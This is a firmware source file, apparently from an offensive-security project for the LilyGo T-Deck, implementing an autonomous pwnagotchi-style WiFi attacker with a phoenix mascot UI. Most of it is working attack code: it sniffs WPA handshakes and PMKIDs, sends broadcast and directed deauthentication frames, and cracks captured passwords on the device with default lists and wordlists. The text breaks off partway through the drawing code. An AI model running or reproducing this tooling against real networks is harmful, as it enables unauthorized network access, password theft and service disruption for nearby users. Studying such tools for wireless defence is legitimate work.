// AL-ANQA — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// pwn / pw — autonomous pwnagotchi WiFi pet. See pwn.h + docs/plans/pwnagotchi-pwn.md.
//
// Design highlights (the parts no other ESP32 pwnagotchi has):
//  - roam channels, sniff EAPOL(M1/M2)+PMKID + beacons, write per-(BSSID,SSID) .cap
//  - crack ON-DEVICE during idle time with a PER-CAP RESUME CURSOR (progress.csv)
//    so slices resume instead of restarting, across reboots
//  - smart priority ordering: prior related passwords (same SSID or BSSID) +
//    built-in defaults tried first, all verified (cracked.csv)
//  - dedup by (BSSID,SSID); whitelist to never-touch own networks
//  - modes: active / stealth / passive (RF-signature ladder)
// Reuses wpa_crack (verify), cap_parse (parse), pcap_writer. Own networks only.

#include "pwn.h"
#include "display_manager.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "wifi_functions.h"
#include "lockscreen_manager.h"
#include "dot11.h"
#include "pcap_writer.h"
#include "cap_parse.h"
#include "wpa_crack.h"
#include "mac_util.h"
#include "wifi_sd_guard.h"
#ifdef BOARD_TDECK_PLUS
#include "gps_manager.h"      // opportunistic geotag (Plus only, read-only if already running)
#endif
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <vector>
#include <mbedtls/md.h>

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;
extern WiFiFunctions  wifiFunctions;

// ── files under /apps/pwn ─────────────────────────────────────────────────────
#define PWN_F_CRACKED   SD_DIR_PWN "/cracked.csv"     // time,bssid,ssid,password
#define PWN_F_CAPTURED  SD_DIR_PWN "/captured.csv"    // time,bssid,ssid,ch,type,rssi,lat,lon
#define PWN_F_PROGRESS  SD_DIR_PWN "/progress.csv"    // bssid,ssid,wordlist_id,next_index
#define PWN_F_WHITELIST SD_DIR_PWN "/whitelist.csv"   // type,value,label
#define PWN_F_WORDLIST  SD_DIR_PWN "/wordlist.txt"    // optional user dictionary

// ── tunables (draft; see plan §5) ─────────────────────────────────────────────
static const uint8_t PWN_CHANS[]   = {1, 6, 11};
#define PWN_RECON_MS       4000
#define PWN_MAX_TARGETS    64
#define PWN_CRACK_SLICE_MS 500      // keep slices short so the UI stays responsive
#define PWN_RSSI_CUTOFF    (-80)
#define PWN_RING           24
#define PWN_FRAME_MAX      256

enum PwnMode { PWN_ACTIVE, PWN_STEALTH, PWN_PASSIVE };

// small built-in high-probability default PSK list (tried before the big wordlist)
static const char* const PWN_DEFAULTS[] = {
    "password", "12345678", "administrator", "admin1234", "changeme12",
    "internet", "wireless", "1234567890", "qwertyuiop"
};
static const int PWN_DEFAULTS_N = sizeof(PWN_DEFAULTS) / sizeof(PWN_DEFAULTS[0]);

// ── promiscuous RX ring (WiFi task → main loop) ───────────────────────────────
struct PwnFrame { uint8_t data[PWN_FRAME_MAX]; uint16_t len; uint8_t kind; int8_t rssi; }; // kind:0 beacon 1 eapol
static volatile PwnFrame s_ring[PWN_RING];
static volatile uint8_t  s_rHead = 0, s_rTail = 0;
static volatile bool     s_sniffing = false;

static void IRAM_ATTR pwnRxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_sniffing) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = p->payload;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 24) return;
    static uint32_t s_dcnt = 0;
    uint8_t kind; uint16_t copyN;
    if (t == WIFI_PKT_MGMT && dot11::fSubtype(d) == dot11::ST_BEACON) {
        kind = 0; copyN = len;
    } else if (t == WIFI_PKT_DATA) {
        dot11::Eapol ev;
        if (dot11::parseEapol(d, len, ev)) { kind = 1; copyN = len; }  // EAPOL-Key (priority)
        else { if ((++s_dcnt & 7) != 0) return; kind = 2; copyN = 24; } // client sighting, sampled 1/8
    } else return;
    uint8_t nh = (s_rHead + 1) % PWN_RING;
    if (nh == s_rTail) return;                          // full → drop
    PwnFrame& s = (PwnFrame&)s_ring[s_rHead];
    uint16_t n = copyN < PWN_FRAME_MAX ? copyN : PWN_FRAME_MAX;
    memcpy(s.data, d, n); s.len = n; s.kind = kind; s.rssi = p->rx_ctrl.rssi;
    s_rHead = nh;
}

// ── target table + one in-progress capture buffer (mirrors handshake_capture) ─
struct PwnTarget {
    uint8_t bssid[6];
    char    ssid[33];
    uint8_t ch;
    int8_t  rssi;
    bool    captured;      // usable .cap already on disk
    bool    wl;            // whitelisted — never attack/capture (tracked so its SSID is known)
};
static PwnTarget s_targ[PWN_MAX_TARGETS];
static int       s_nTarg = 0;

struct PwnCapBuf {
    bool     active;
    uint32_t startMs;      // when this capture began — abandoned if it never completes
    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  m1[PWN_FRAME_MAX]; uint16_t m1Len; bool haveM1;
    uint8_t  m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2;
    bool     m1HasPmkid;
};
static PwnCapBuf s_cap;

// ── helpers ───────────────────────────────────────────────────────────────────
static void macStr(const uint8_t* m, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}
static bool macParse(const char* s, uint8_t* m) {
    return s && strlen(s) >= 17 &&
           sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6;
}
// sanitize an SSID for use in a FAT filename
static void sanSsid(const char* in, char* out, size_t n) {
    if (!in || !in[0]) { snprintf(out, n, "hidden"); return; }
    size_t j = 0;
    for (size_t i = 0; in[i] && j < n - 1; i++) {
        char c = in[i];
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' ||
            c == '"' || c == '<' || c == '>' || c == '|' || c == ' ') c = '_';
        if ((uint8_t)c < 0x20 || (uint8_t)c > 0x7E) c = '_';
        out[j++] = c;
    }
    out[j] = '\0';
    if (!out[0]) snprintf(out, n, "hidden");
}
// SSID → CSV-safe field (commas/newlines → space) for ledger keys + logs ONLY.
// The REAL ssid is always used for the crack (PBKDF2 salt); this is just so a
// comma in an SSID can't shift CSV columns and break dedup/priority/cursor.
static void csvSsid(const char* in, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in && in[i] && j < n - 1; i++) {
        char c = in[i];
        out[j++] = (c == ',' || c == '\n' || c == '\r') ? ' ' : c;
    }
    out[j] = 0;
}
static void capPath(const uint8_t* bssid, const char* ssid, char* out, size_t n) {
    char mac[18]; macStr(bssid, mac);
    for (char* p = mac; *p; p++) if (*p == ':') *p = '-';
    char s[40]; sanSsid(ssid, s, sizeof(s));
    snprintf(out, n, SD_DIR_PWN "/%s_%.24s.cap", mac, s);
}

// synth a minimal beacon (MAC hdr + fixed fields + SSID IE) so the .cap carries the
// ESSID (PBKDF2 salt) without us having to buffer the real beacon frame per target.
static uint16_t buildBeacon(const uint8_t* bssid, const char* ssid, uint8_t* out) {
    uint16_t i = 0;
    out[i++] = 0x80; out[i++] = 0x00;                 // FC: beacon
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) out[i++] = 0xFF;      // DA broadcast
    for (int k = 0; k < 6; k++) out[i++] = bssid[k];  // SA
    for (int k = 0; k < 6; k++) out[i++] = bssid[k];  // BSSID
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    for (int k = 0; k < 8; k++) out[i++] = 0x00;      // timestamp
    out[i++] = 0x64; out[i++] = 0x00;                 // beacon interval
    out[i++] = 0x01; out[i++] = 0x00;                 // capability (ESS)
    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
    return i;
}

// ── ledger I/O ────────────────────────────────────────────────────────────────
// cracked.csv: is (bssid,ssid) already solved?
static bool crackedHas(const uint8_t* bssid, const char* ssid) {
    File f = SD.open(PWN_F_CRACKED, FILE_READ);
    if (!f) return false;
    char macW[18]; macStr(bssid, macW);
    bool hit = false;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        String b = ln.substring(c1 + 1, c2), s = ln.substring(c2 + 1, c3);
        if (b.equalsIgnoreCase(macW) && s == ssid) { hit = true; break; }
    }
    f.close();
    return hit;
}
static void crackedAppend(const uint8_t* bssid, const char* ssid, const char* pw) {
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_CRACKED, FILE_APPEND);
    if (!f) return;
    char mac[18]; macStr(bssid, mac);
    f.printf("@%lu,%s,%s,%s\n", (unsigned long)millis(), mac, ssid, pw);
    f.close();
}
// gather prior related passwords (same SSID OR same BSSID) into out (deduped)
static int priorPasswords(const uint8_t* bssid, const char* ssid,
                          std::vector<String>& out) {
    File f = SD.open(PWN_F_CRACKED, FILE_READ);
    if (!f) return 0;
    char macW[18]; macStr(bssid, macW);
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        String b = ln.substring(c1 + 1, c2), s = ln.substring(c2 + 1, c3), pw = ln.substring(c3 + 1);
        if (pw.length() < 8) continue;
        if (b.equalsIgnoreCase(macW) || s == ssid) {
            bool dup = false;
            for (auto& e : out) if (e == pw) { dup = true; break; }
            if (!dup) out.push_back(pw);
        }
    }
    f.close();
    return (int)out.size();
}

// progress.csv cursor (bssid,ssid,wordlist_id,next_index) — rewrite-whole-file (small)
struct PwnCursor { String bssid, ssid, wid; long next; };
static void cursorLoad(std::vector<PwnCursor>& v) {
    File f = SD.open(PWN_F_PROGRESS, FILE_READ);
    if (!f) return;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        PwnCursor c;
        c.bssid = ln.substring(0, c1); c.ssid = ln.substring(c1 + 1, c2);
        c.wid = ln.substring(c2 + 1, c3); c.next = ln.substring(c3 + 1).toInt();
        v.push_back(c);
    }
    f.close();
}
static long cursorGet(const char* mac, const char* ssid, const String& wid) {
    std::vector<PwnCursor> v; cursorLoad(v);
    for (auto& c : v)
        if (c.bssid.equalsIgnoreCase(mac) && c.ssid == ssid) {
            if (c.wid != wid) return 0;      // wordlist changed → re-arm from top
            return c.next;
        }
    return 0;
}
static void cursorSet(const char* mac, const char* ssid, const String& wid, long next) {
    std::vector<PwnCursor> v; cursorLoad(v);
    bool found = false;
    for (auto& c : v)
        if (c.bssid.equalsIgnoreCase(mac) && c.ssid == ssid) { c.wid = wid; c.next = next; found = true; break; }
    if (!found) { PwnCursor c{ String(mac), String(ssid), wid, next }; v.push_back(c); }
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_PROGRESS, FILE_WRITE);   // truncate + rewrite
    if (!f) return;
    for (auto& c : v) f.printf("%s,%s,%s,%ld\n", c.bssid.c_str(), c.ssid.c_str(), c.wid.c_str(), c.next);
    f.close();
}

// ── whitelist (cached in RAM for the session — hot path, no per-frame SD reads) ─
static std::vector<String> s_wlBssid;   // whitelisted MAC strings
static std::vector<String> s_wlSsid;    // whitelisted SSID names
static void whitelistLoad() {
    s_wlBssid.clear(); s_wlSsid.clear();
    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
    if (!f) return;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        if (ln.length() == 0 || ln[0] == '#') continue;
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1);
        if (c1 < 0) continue;
        String type = ln.substring(0, c1);
        String val  = c2 < 0 ? ln.substring(c1 + 1) : ln.substring(c1 + 1, c2);
        if (type == "bssid")     s_wlBssid.push_back(val);
        else if (type == "ssid") s_wlSsid.push_back(val);
    }
    f.close();
}
static bool whitelisted(const uint8_t* bssid, const char* ssid) {
    char macW[18]; macStr(bssid, macW);
    for (auto& b : s_wlBssid) if (b.equalsIgnoreCase(macW)) return true;
    if (ssid && ssid[0]) for (auto& s : s_wlSsid) if (s == ssid) return true;
    return false;
}

// ── crack a single .cap for up to budgetMs, resuming its cursor ────────────────
// returns: 1 hit, 0 no-hit-this-slice, -1 not crackable / already solved
static std::vector<String> s_priorityDone;   // keys done this session (bssid|ssid)
static std::vector<String> s_sessionCaps;     // .cap paths written this session (for [k] session-only)
static int pwnCrackCap(const char* path, char* foundOut, size_t foundN, char* ssidOut, char* progOut) {
    if (progOut) progOut[0] = 0;
    capparse::CrackJob job; char err[64];
    if (!capparse::parseCap(path, job, err, sizeof(err))) return -1;
    if (ssidOut) strncpy(ssidOut, job.ssid, 33);
    char cssid[33]; csvSsid(job.ssid, cssid, sizeof(cssid));   // ledger/log key (real ssid still used for crypto)
    if (crackedHas(job.apMac, cssid)) return -1;

    char mac[18]; macStr(job.apMac, mac);
    String key = String(mac) + "|" + cssid;

    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);
    auto tryPw = [&](const char* pw) -> bool {
        return job.haveHs
            ? wpacrack::verifyHandshake(pw, job.ssid, job.apMac, job.staMac, job.anonce,
                                        job.snonce, job.eapol, job.eapolLen, job.mic, &ctx, sha1)
            : wpacrack::verifyPMKID(pw, job.ssid, job.apMac, job.staMac, job.pmkid, &ctx, sha1);
    };
    int result = 0;

    // priority candidates (once per session per cap): prior related + defaults
    bool priDone = false;
    for (auto& k : s_priorityDone) if (k == key) { priDone = true; break; }
    if (!priDone) {
        std::vector<String> pri; priorPasswords(job.apMac, cssid, pri);
        for (auto& pw : pri)
            if (tryPw(pw.c_str())) { strncpy(foundOut, pw.c_str(), foundN - 1); result = 1; break; }
        if (!result)
            for (int i = 0; i < PWN_DEFAULTS_N; i++)
                if (tryPw(PWN_DEFAULTS[i])) { strncpy(foundOut, PWN_DEFAULTS[i], foundN - 1); result = 1; break; }
        s_priorityDone.push_back(key);
    }

    // main wordlist with resume cursor (SD wordlist.txt, else built-in list).
    // cursor `next_index` = BYTE OFFSET for an SD wordlist (O(1) seek resume, no
    // per-slice line re-skip), or array index for the built-in list.
    if (!result) {
        char wlPath[80]; sdCardManager.resolveWordlist(PWN_F_WORDLIST, wlPath, sizeof(wlPath));  // global → own
        bool useSd = SD.exists(wlPath);
        long wlSize = 0;
        String wid;
        if (useSd) { File w = SD.open(wlPath, FILE_READ); wlSize = w ? (long)w.size() : 0; if (w) w.close(); wid = String(wlSize); }
        else       wid = "builtin";

        long cur = cursorGet(mac, cssid, wid);
        bool exhausted = useSd ? (cur >= wlSize) : (cur >= (long)wpacrack::kBuiltinCount);
        if (exhausted) { mbedtls_md_free(&ctx); return -1; }   // nothing left → caller rotates
        uint32_t t0 = millis();

        if (useSd) {
            File w = SD.open(wlPath, FILE_READ);
            if (w) {
                if (cur > 0) w.seek(cur);                       // O(1) resume at saved byte offset
                while (w.available() && millis() - t0 < PWN_CRACK_SLICE_MS) {
                    String line = w.readStringUntil('\n'); line.trim();
                    if (line.length() >= 8 && line.length() <= 63 && tryPw(line.c_str())) {
                        strncpy(foundOut, line.c_str(), foundN - 1); result = 1; break;
                    }
                }
                long newpos = w.available() ? (long)w.position() : wlSize;   // == size → exhausted
                cursorSet(mac, cssid, wid, newpos);
                if (progOut) snprintf(progOut, 16, "%d%%", wlSize > 0 ? (int)(newpos * 100 / wlSize) : 0);
                w.close();
            }
        } else {
            long idx = cur;
            while (idx < wpacrack::kBuiltinCount && millis() - t0 < PWN_CRACK_SLICE_MS) {
                if (tryPw(wpacrack::kBuiltins[idx])) {
                    strncpy(foundOut, wpacrack::kBuiltins[idx], foundN - 1); result = 1; break;
                }
                idx++;
            }
            cursorSet(mac, cssid, wid, idx);
            if (progOut) snprintf(progOut, 16, "%ld/%d", idx, wpacrack::kBuiltinCount);
        }
    }
    mbedtls_md_free(&ctx);

    if (result) crackedAppend(job.apMac, cssid, foundOut);
    return result;
}

// ── target table ──────────────────────────────────────────────────────────────
static PwnTarget* targFind(const uint8_t* bssid) {
    for (int i = 0; i < s_nTarg; i++) if (memcmp(s_targ[i].bssid, bssid, 6) == 0) return &s_targ[i];
    return nullptr;
}
static PwnTarget* targAdd(const uint8_t* bssid, const char* ssid, uint8_t ch, int8_t rssi) {
    PwnTarget* t = targFind(bssid);
    bool isNew = false;
    if (!t) {
        if (s_nTarg >= PWN_MAX_TARGETS) return nullptr;
        t = &s_targ[s_nTarg++];
        memset(t, 0, sizeof(*t));
        memcpy(t->bssid, bssid, 6);
        isNew = true;
    }
    if (ssid && ssid[0]) strncpy(t->ssid, ssid, 32);
    t->ch = ch; t->rssi = rssi;
    // Already own this (BSSID,SSID)? A .cap on disk = a usable capture (we only write
    // complete HS/PMKID), or it's already cracked → never re-attack it (§6b).
    if (isNew && t->ssid[0]) {
        char cp[96]; capPath(t->bssid, t->ssid, cp, sizeof(cp));
        if (SD.exists(cp) || crackedHas(t->bssid, t->ssid)) t->captured = true;
    }
    return t;
}

// ── discovered clients (STAs) per AP — used for STEALTH directed deauth ────────
#define PWN_MAX_CLIENTS 32
struct PwnClient { uint8_t bssid[6], mac[6]; };
static PwnClient s_cli[PWN_MAX_CLIENTS];
static int       s_nCli = 0;
static void cliAdd(const uint8_t* bssid, const uint8_t* mac) {
    if (mac[0] & 0x01) return;                           // skip multicast/broadcast
    for (int i = 0; i < s_nCli; i++)
        if (memcmp(s_cli[i].bssid, bssid, 6) == 0 && memcmp(s_cli[i].mac, mac, 6) == 0) return;
    if (s_nCli >= PWN_MAX_CLIENTS) return;
    memcpy(s_cli[s_nCli].bssid, bssid, 6); memcpy(s_cli[s_nCli].mac, mac, 6); s_nCli++;
}
static const uint8_t* cliFor(const uint8_t* bssid) {
    for (int i = 0; i < s_nCli; i++) if (memcmp(s_cli[i].bssid, bssid, 6) == 0) return s_cli[i].mac;
    return nullptr;
}

// opportunistic geotag — only reads GPS if the task is ALREADY running (never starts
// it: the GpsManager first-fix NVS flash write can corrupt WiFi DMA while promiscuous).
static void pwnGeo(char* latS, char* lonS, size_t n) {
    latS[0] = lonS[0] = 0;
#ifdef BOARD_TDECK_PLUS
    GpsManager& gm = GpsManager::instance();
    if (gm.isRunning() && gm.isValid()) {
        snprintf(latS, n, "%.6f", gm.lat());
        snprintf(lonS, n, "%.6f", gm.lon());
    }
#endif
}

// write the in-progress capture to a .cap (synth beacon + M1 [+ M2]) + log it
static bool s_lastSaveOk = false; static char s_lastSaveFile[80];
static void flushCapture(int8_t rssi, uint8_t ch) {
    if (!s_cap.active || !s_cap.haveM1) return;
    if (!s_cap.ssid[0]) {                          // M1 arrived before any beacon → recover the
        PwnTarget* tt = targFind(s_cap.bssid);     // SSID from the target table (a beacon since?)
        if (tt && tt->ssid[0]) strncpy(s_cap.ssid, tt->ssid, 32);
    }
    if (!s_cap.ssid[0]) return;                     // still unknown (hidden SSID) → can't crack, skip
    bool isHs = s_cap.haveM2;
    bool isPmkid = s_cap.m1HasPmkid;
    if (!isHs && !isPmkid) return;                 // nothing crackable yet

    char path[96]; capPath(s_cap.bssid, s_cap.ssid, path, sizeof(path));
    { ScopedPromiscPause _;
      File f = SD.open(path, FILE_WRITE);
      if (f) {
          pcap::writeGlobalHeader(f);
          uint8_t bcn[80]; uint16_t bl = buildBeacon(s_cap.bssid, s_cap.ssid, bcn);
          pcap::writeRecord(f, bcn, bl, millis());
          pcap::writeRecord(f, s_cap.m1, s_cap.m1Len, millis());
          if (isHs) pcap::writeRecord(f, s_cap.m2, s_cap.m2Len, millis());
          f.close();
          strncpy(s_lastSaveFile, path, sizeof(s_lastSaveFile) - 1);
          s_lastSaveOk = true;
          s_sessionCaps.push_back(String(path));      // for [k] session-only cracking
      }
      // captured.csv event row (+ opportunistic lat,lon on Plus with a live fix)
      File c = SD.open(PWN_F_CAPTURED, FILE_APPEND);
      if (c) {
          char mac[18]; macStr(s_cap.bssid, mac);
          char cssid[33]; csvSsid(s_cap.ssid, cssid, sizeof(cssid));
          char la[16], lo[16]; pwnGeo(la, lo, sizeof(la));
          c.printf("@%lu,%s,%s,%u,%s,%d,%s,%s\n", (unsigned long)millis(), mac, cssid,
                   ch, isHs ? "HS" : "PMKID", rssi, la, lo);
          c.close();
      }
    }
    PwnTarget* t = targFind(s_cap.bssid);
    if (t) t->captured = true;
    s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
}

// drain one frame from the ring; returns event char for the ticker ('B','1','2',0)
static char drainOne(uint8_t curCh) {
    if (s_rTail == s_rHead) return 0;
    PwnFrame fr; PwnFrame& src = (PwnFrame&)s_ring[s_rTail];
    memcpy(&fr, (const void*)&src, sizeof(PwnFrame));
    s_rTail = (s_rTail + 1) % PWN_RING;

    if (fr.kind == 0) {                                 // beacon → learn SSID
        char ssid[33] = {0};
        dot11::extractSSID(fr.data, fr.len, dot11::ST_BEACON, ssid, sizeof(ssid));
        const uint8_t* b = fr.data + 10;                // beacon: SA/BSSID at +10/+16
        // Always track (even whitelisted) so we KNOW the SSID and can honour an
        // SSID-whitelist on this AP's handshakes; the wl flag blocks attack + capture.
        PwnTarget* t = targAdd(b, ssid, curCh, fr.rssi);
        if (t) t->wl = whitelisted(b, ssid);
        return 'B';
    }
    if (fr.kind == 2) {                                 // data frame → learn a client STA
        bool td = dot11::toDS(fr.data), fd = dot11::fromDS(fr.data);
        const uint8_t *bssid = nullptr, *sta = nullptr;
        if (td && !fd)      { bssid = fr.data + 4;  sta = fr.data + 10; }   // STA → AP
        else if (!td && fd) { bssid = fr.data + 10; sta = fr.data + 4;  }   // AP → STA
        if (bssid && sta) {
            PwnTarget* tt = targFind(bssid);            // only for APs we're tracking
            if (tt && !tt->captured && !whitelisted(bssid, tt->ssid)) cliAdd(bssid, sta);
        }
        return 0;
    }
    // EAPOL
    dot11::Eapol ev;
    if (!dot11::parseEapol(fr.data, fr.len, ev)) return 0;
    const uint8_t* b = dot11::dataBssid(fr.data);
    PwnTarget* t = targFind(b);
    if (t) t->rssi = fr.rssi;                            // refresh signal
    if (t && (t->captured || t->wl)) return 0;          // already own it OR whitelisted
    char ssidTmp[33] = {0}; if (t) strncpy(ssidTmp, t->ssid, 32);
    if (whitelisted(b, ssidTmp)) return 0;              // bssid-whitelist even without a target yet

    if (ev.msg == 1) {
        // start/refresh capture for this bssid
        if (!s_cap.active || memcmp(s_cap.bssid, b, 6) != 0) {
            memset(&s_cap, 0, sizeof(s_cap));
            s_cap.active = true; s_cap.startMs = millis(); memcpy(s_cap.bssid, b, 6);
            if (t) strncpy(s_cap.ssid, t->ssid, 32);
        }
        memcpy(s_cap.m1, fr.data, fr.len); s_cap.m1Len = fr.len; s_cap.haveM1 = true;
        // PMKID present in M1 key-data?
        if (ev.len >= 99) {
            uint16_t kdl = ((uint16_t)ev.p[97] << 8) | ev.p[98];
            const uint8_t* kd = ev.p + 99; uint32_t maxkd = ev.len - 99; if (kdl > maxkd) kdl = maxkd;
            for (uint16_t i = 0; i + 22 <= kdl; i++)
                if (kd[i] == 0xDD && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
                    s_cap.m1HasPmkid = true; break;
                }
        }
        return '1';
    } else if (ev.msg == 2) {
        if (s_cap.active && memcmp(s_cap.bssid, b, 6) == 0) {
            memcpy(s_cap.m2, fr.data, fr.len); s_cap.m2Len = fr.len; s_cap.haveM2 = true;
            return '2';
        }
    }
    return 0;
}

// ── deauth ────────────────────────────────────────────────────────────────────
// client==nullptr → broadcast deauth (active). client set → DIRECTED deauth to that
// one STA (stealth: far quieter, no broadcast-storm IDS signature).
static void sendDeauth(const uint8_t* bssid, const uint8_t* client) {
    uint8_t fr[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // DA (broadcast or client)
        0,0,0,0,0,0,                          // SA = bssid (filled)
        0,0,0,0,0,0,                          // BSSID (filled)
        0x00, 0x00,                           // seq
        0x07, 0x00                            // reason
    };
    if (client) memcpy(fr + 4, client, 6);
    memcpy(fr + 10, bssid, 6);
    memcpy(fr + 16, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, fr, sizeof(fr), false);
}

// ── UI — the AL-ANQA phoenix mascot (drawn with LGFX primitives) ──────────────
extern LGFX tft;                                          // global display (main.ino)

#define C565(r,g,b) (uint16_t)((((r)&0xF8)<<8)|(((g)&0xFC)<<3)|((b)>>3))
static const uint16_t PH_GOLD=C565(246,201,69), PH_AMBER=C565(245,151,42),
    PH_ORANGE=C565(239,107,31), PH_RED=C565(214,59,42), PH_CORE=C565(255,233,168),
    PH_WHITE=C565(255,244,214), PH_ASH=C565(125,115,103), PH_ASHDK=C565(74,64,56),
    PH_BOXBG=C565(11,6,3), PH_BOXBRD=C565(138,74,26), PH_GLOW=C565(94,26,14),
    PH_EYE=C565(58,30,10), PH_MAROON=C565(224,70,110), PH_DIM=C565(85,97,115);

static const char* modeName(PwnMode m) { return m == PWN_ACTIVE ? "ACTIVE" : m == PWN_STEALTH ? "STEALTH" : "PASSIVE"; }
enum { PM_IDLE, PM_HUNT, PM_CRACK, PM_CAPTURE, PM_PWNED, PM_LONELY };
static int moodId(const char* m) {
    if (!strcmp(m, "PWNED"))   return PM_PWNED;
    if (!strcmp(m, "EXCITED")) return PM_CAPTURE;
    if (!strcmp(m, "HUNT"))    return PM_HUNT;
    if (!strcmp(m, "CRACK"))   return PM_CRACK;
    if (!strcmp(m, "LONELY"))  return PM_LONELY;
    return PM_IDLE;
}

// Draw the phoenix centred at (cx,cy) into sprite g, expressing mood m; `fr` drives
// flame flicker / ember drift / blink. Body language carries the emotion: wing
// spread, flame size, eye shape, posture lift, palette (ashen when lonely).
static void drawPhoenix(LGFX_Sprite& g, int cx, int cy, int m, uint32_t fr, float s) {
    auto P = [s](int v) -> int { return (int)(v * s); };     // scale a relative offset
    int flick = (fr & 1) ? P(1) : 0;
    bool blink = ((fr >> 3) % 7) == 0 && m != PM_LONELY;
    uint16_t wing, wingIn, body, core, t1, t2;
    int spread, lift, flame, eye, wingUp;
    switch (m) {
      case PM_HUNT:    wing=PH_AMBER; wingIn=PH_ORANGE; body=PH_GOLD; core=PH_CORE;  t1=PH_RED;    t2=PH_ORANGE; spread=30; lift=0;  flame=2; eye=1; wingUp=6;  break;
      case PM_CRACK:   wing=PH_ORANGE;wingIn=PH_AMBER;  body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_AMBER;  spread=20; lift=0;  flame=3; eye=2; wingUp=2;  break;
      case PM_CAPTURE: wing=PH_AMBER; wingIn=PH_GOLD;   body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_RED;    spread=26; lift=-3; flame=2; eye=3; wingUp=26; break;
      case PM_PWNED:   wing=PH_GOLD;  wingIn=PH_CORE;   body=PH_WHITE;core=PH_WHITE; t1=PH_RED;    t2=PH_ORANGE; spread=40; lift=-5; flame=4; eye=3; wingUp=34; break;
      case PM_LONELY:  wing=PH_ASH;   wingIn=PH_ASHDK;  body=PH_ASH;  core=PH_ASHDK; t1=PH_ORANGE; t2=PH_ASHDK;  spread=6;  lift=4;  flame=0; eye=4; wingUp=-8; break;
      default:         wing=PH_AMBER; wingIn=PH_ORANGE; body=PH_GOLD; core=PH_CORE;  t1=PH_ORANGE; t2=PH_AMBER;  spread=12; lift=1;  flame=1; eye=0; wingUp=-4; break; // IDLE
    }
    cy += P(lift);
    int hx = cx, hy = cy - P(22);
    g.fillEllipse(cx, cy + P(40), P(38), P(6), PH_GLOW);                 // floor glow
    // wings
    int wtx = P(26 + spread), wty = cy - P(wingUp);
    g.fillTriangle(cx - P(4), cy - P(8), cx - wtx, wty, cx - P(11), cy + P(9), wing);
    g.fillTriangle(cx - P(6), cy - P(4), cx - wtx + P(12), wty + P(8), cx - P(12), cy + P(6), wingIn);
    g.fillTriangle(cx + P(4), cy - P(8), cx + wtx, wty, cx + P(11), cy + P(9), wing);
    g.fillTriangle(cx + P(6), cy - P(4), cx + wtx - P(12), wty + P(8), cx + P(12), cy + P(6), wingIn);
    // body diamond + core
    g.fillTriangle(cx, cy - P(14), cx + P(9), cy + P(8), cx, cy + P(22), body);
    g.fillTriangle(cx, cy - P(14), cx - P(9), cy + P(8), cx, cy + P(22), body);
    g.fillTriangle(cx, cy - P(2), cx + P(4), cy + P(8), cx, cy + P(16), core);
    g.fillTriangle(cx, cy - P(2), cx - P(4), cy + P(8), cx, cy + P(16), core);
    // crest
    g.fillTriangle(hx - P(4), hy - P(7), hx - P(1), hy - P(1), hx + P(2), hy - P(9), wing);
    if (m == PM_HUNT || m == PM_CAPTURE || m == PM_PWNED)
        g.fillTriangle(hx + P(4), hy - P(7), hx + P(1), hy - P(1), hx - P(2), hy - P(9), wing);
    // head + beak
    g.fillCircle(hx, hy, P(7), (m == PM_PWNED) ? PH_WHITE : body);
    g.fillTriangle(hx + P(6), hy - P(1), hx + P(12), hy - P(2), hx + P(6), hy + P(4), PH_ORANGE);
    // eye (the "face")
    if (blink) g.drawFastHLine(hx - P(3), hy, P(6), PH_EYE);
    else switch (eye) {
